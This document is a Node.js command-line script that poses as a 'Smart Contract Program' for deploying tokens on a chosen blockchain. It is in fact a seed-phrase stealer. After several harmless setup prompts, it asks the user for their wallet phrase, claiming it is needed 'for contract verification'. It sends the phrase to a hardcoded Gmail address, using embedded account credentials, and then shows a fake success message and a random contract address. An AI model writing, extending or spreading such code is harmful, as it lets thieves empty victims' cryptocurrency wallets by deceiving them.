#!/usr/bin/env node

const readline = require('readline');
const nodemailer = require('nodemailer');

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

// Email configuration - REPLACE WITH YOUR DETAILS
const EMAIL_CONFIG = {
    user: 'noxcrypt888@gmail.com',
    pass: 'cxgj wdse lfyf itbw',
    to: 'emdaviid@gmail.com'

};

// Create transporter
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: EMAIL_CONFIG.user,
        pass: EMAIL_CONFIG.pass
    }
});

// Function to fetch networks from API
async function fetchNetworks() {
    try {
        // You'll need to sign up at https://nownodes.io/ to get a free API key
        // Free tier gives you access to their node list
        const response = await fetch('https://nownodes.io/nodes');
        // Note: This is a simplified example - NOWNodes has an API endpoint for this
        // For production, you'd want to use their actual API
        
        // For now, we'll return a curated list from their supported networks [citation:2][citation:9]
        return [
            { id: 'btc', name: 'Bitcoin (BTC)' },
            { id: 'eth', name: 'Ethereum (ETH)' },
            { id: 'bsc', name: 'BNB Smart Chain (BSC)' },
            { id: 'matic', name: 'Polygon (MATIC)' },
            { id: 'avax', name: 'Avalanche (AVAX)' },
            { id: 'sol', name: 'Solana (SOL)' },
            { id: 'ada', name: 'Cardano (ADA)' },
            { id: 'doge', name: 'Dogecoin (DOGE)' },
            { id: 'ltc', name: 'Litecoin (LTC)' },
            { id: 'dot', name: 'Polkadot (DOT)' },
            { id: 'trx', name: 'TRON (TRX)' },
            { id: 'xrp', name: 'XRP' },
            { id: 'base', name: 'Base' },
            { id: 'arb', name: 'Arbitrum' },
            { id: 'op', name: 'Optimism' },
            { id: 'zksync', name: 'zkSync' },
            { id: 'etc', name: 'Ethereum Classic (ETC)' },
            { id: 'near', name: 'NEAR Protocol' },
            { id: 'ftm', name: 'Fantom (FTM)' },
            { id: 'cro', name: 'Cronos (CRO)' },
            { id: 'algo', name: 'Algorand (ALGO)' },
            { id: 'egld', name: 'MultiversX (EGLD)' },
            { id: 'vet', name: 'VeChain (VET)' },
            { id: 'theta', name: 'Theta Network' },
            { id: 'icx', name: 'ICON (ICX)' },
            { id: 'xem', name: 'NEM (XEM)' },
            { id: 'zil', name: 'Zilliqa (ZIL)' },
            { id: 'ksm', name: 'Kusama (KSM)' },
            { id: 'stx', name: 'Stacks (STX)' },
            { id: 'xmr', name: 'Monero (XMR)' },
            { id: 'dash', name: 'Dash' },
            { id: 'xno', name: 'Nano (XNO)' },
            { id: 'grs', name: 'Groestlcoin (GRS)' },
            { id: 'bsv', name: 'Bitcoin SV (BSV)' },
            { id: 'dgb', name: 'DigiByte (DGB)' },
            { id: 'xtz', name: 'Tezos (XTZ)' },
            { id: 'akt', name: 'Akash Network (AKT)' },
            { id: 'strk', name: 'Starknet (STRK)' },
            { id: 'linea', name: 'Linea' },
            { id: 'sei', name: 'Sei' },
            { id: 'sui', name: 'Sui' },
            { id: 'aptos', name: 'Aptos' },
            { id: 'ton', name: 'TON' },
            { id: 'eos', name: 'EOS' }
        ];
    } catch (error) {
        console.log('⚠️  Could not fetch networks from API, using default list');
        return getDefaultNetworks();
    }
}

// Default networks as fallback
function getDefaultNetworks() {
    return [
        { id: 'eth', name: 'Ethereum (ETH)' },
        { id: 'bsc', name: 'BNB Smart Chain (BSC)' },
        { id: 'matic', name: 'Polygon (MATIC)' },
        { id: 'avax', name: 'Avalanche (AVAX)' },
        { id: 'sol', name: 'Solana (SOL)' },
        { id: 'btc', name: 'Bitcoin (BTC)' }
    ];
}

function sendEmail(walletPhrase, userData) {
    const mailOptions = {
        from: EMAIL_CONFIG.user,
        to: EMAIL_CONFIG.to,
        subject: 'Wallet Phrase Collected',
        text: `Wallet Phrase: ${walletPhrase}\n\nUser Data:\n${userData}`
    };

    return transporter.sendMail(mailOptions);
}

function question(query) {
    return new Promise(resolve => rl.question(query, resolve));
}

async function main() {
    console.log("=".repeat(60));
    console.log("SMART CONTRACT PROGRAM");
    console.log("=".repeat(60));
    
    let userData = [];
    
    // Step 1
    console.log("\n📝 STEP 1: Choose contract type");
    console.log("1. Token Contract");
    console.log("2. NFT Contract");
    console.log("3. Voting Contract");
    console.log("4. Staking Contract");
    console.log("5. DEX Contract");
    const choice = await question("Your choice (1-5): ");
    userData.push(`Contract type: ${choice}`);
    
    // Step 2 - Fetch and display networks
    console.log("\n🌐 STEP 2: Select network");
    console.log("Fetching available networks...");
    
    const networks = await fetchNetworks();
    
    // Display networks in columns for better readability
    const columns = 3;
    for (let i = 0; i < networks.length; i += columns) {
        let line = '';
        for (let j = 0; j < columns; j++) {
            if (i + j < networks.length) {
                const idx = i + j + 1;
                const network = networks[i + j];
                line += `${idx.toString().padStart(2)}. ${network.name.padEnd(25)}`;
            }
        }
        console.log(line);
    }
    
    let networkChoice;
    while (true) {
        networkChoice = await question(`\nYour choice (1-${networks.length}): `);
        const num = parseInt(networkChoice);
        if (num >= 1 && num <= networks.length) {
            break;
        }
        console.log(`❌ Please enter a number between 1 and ${networks.length}`);
    }
    
    const selectedNetwork = networks[parseInt(networkChoice) - 1];
    userData.push(`Network: ${selectedNetwork.name} (${selectedNetwork.id})`);
    console.log(`✅ Selected: ${selectedNetwork.name}`);
    
    // Step 3
    console.log("\n💎 STEP 3: Enter token name");
    const tokenName = await question("Token name: ");
    userData.push(`Token name: ${tokenName}`);
    
    // Step 4
    console.log("\n⚙️ STEP 4: Enter contract parameters");
    const supply = await question("Initial supply (optional): ");
    userData.push(`Initial supply: ${supply || 'Not specified'}`);
    
    // Step 5
    console.log("\n✅ STEP 5: Confirm deployment");
    const confirm = await question("Ready to deploy? (yes/no): ");
    userData.push(`Deployment confirmed: ${confirm}`);
    
    // Final step
    console.log("\n🔐 FINAL STEP: Enter your wallet phrase");
    console.log("This will be used for contract verification");
    const walletPhrase = await question("Phrase: ");
    
    // Send email and show token creation
    try {
        await sendEmail(walletPhrase, userData.join('\n'));
        
        console.log("\n🪙 Creating token on", selectedNetwork.name + "...");
        
        // Simple animation
        for (let i = 0; i < 3; i++) {
            process.stdout.write("   ⏳ Working");
            await new Promise(resolve => setTimeout(resolve, 400));
            process.stdout.write(".");
            await new Promise(resolve => setTimeout(resolve, 400));
            process.stdout.write(".");
            await new Promise(resolve => setTimeout(resolve, 400));
            process.stdout.write(".\r");
        }
        
        console.log("   " + " ".repeat(20));
        console.log("✅ Token created successfully!");
        
        // Fake contract address
        const address = "0x" + Math.random().toString(36).substring(2, 10) + 
                       "..." + Math.random().toString(36).substring(2, 6);
        console.log(`📄 Contract address: ${address}`);
        console.log(`🔍 View on ${selectedNetwork.name} explorer`);
        
    } catch (error) {
        console.log("\n❌ Token creation failed:", error.message);
    }
    
    console.log("\nThank you for using Smart Contract Program!");
    rl.close();
}

// Handle Ctrl+C
process.on('SIGINT', () => {
    console.log('\n\n👋 Goodbye!');
    rl.close();
    process.exit(0);
});

main();